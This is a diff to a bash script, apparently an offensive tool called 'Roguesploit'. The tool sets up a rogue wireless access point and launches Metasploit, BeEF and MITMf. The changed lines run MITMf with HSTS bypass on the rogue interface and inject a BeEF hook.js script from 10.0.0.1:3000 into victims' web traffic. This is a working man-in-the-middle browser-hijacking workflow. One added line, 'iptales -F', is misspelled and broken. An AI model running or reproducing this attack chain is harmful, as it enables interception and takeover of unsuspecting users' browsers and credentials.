@@ -40,16 +40,14 @@ msfdb start
 msfd
 pkill dhcpd
 pkill airbase-ng
+iptales -F
 airmon-ng stop wlan1mon
 sleep 3
-echo -ne $red"Press any key to continue... "
-read starting
-clear
 
 ###################################################
 # CTRL C
 ###################################################
-trap ctrl_c INT
+trap ctrl_c SIGINT
 ctrl_c() {
 clear
 echo -e $red"--<[!] (Ctrl + C ) Detected, Trying To Exit... [!]>--"
@@ -922,8 +920,7 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 30 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e ./BeEFStarter & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js"
-#mitmf -i wlan1 --hsts --browsersniper --inject --js-url http://10.0.0.1:3000/hook.js
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 30 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "./BeEFStarter" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i at0 --hsts --inject --js-url http://10.0.0.1:3000/hook.js"
 	menu
 }
 #Welcome Screen
